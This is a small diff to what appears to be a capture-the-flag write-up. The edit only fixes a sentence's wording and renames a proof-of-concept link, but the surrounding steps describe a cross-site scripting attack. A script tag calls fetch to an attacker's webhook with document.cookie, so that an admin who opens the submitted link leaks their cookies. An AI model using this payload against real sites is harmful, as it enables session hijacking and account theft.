@@ -12,6 +12,6 @@
 1. Get a URL in Webhook to collect the requests
 2. Encode the following script `<script>fetch("webhook?=cookie="+document.cookie)</script>` (where webhook is you URL).
 3. Write this script into the `Link of the bug/feature request you want to report on.` box and click `Submit`.
-4. When the admin opens the link the script will execute it will send a request to your webhook with their cookies (and the flag).
+4. When the admin opens the link, the script will execute it and send a request to your webhook with their cookies (and the flag).
 
-[(POC)](my_favorite_cookies_poc.py)
+[(POC)](my_favourite_cookies_poc.py)
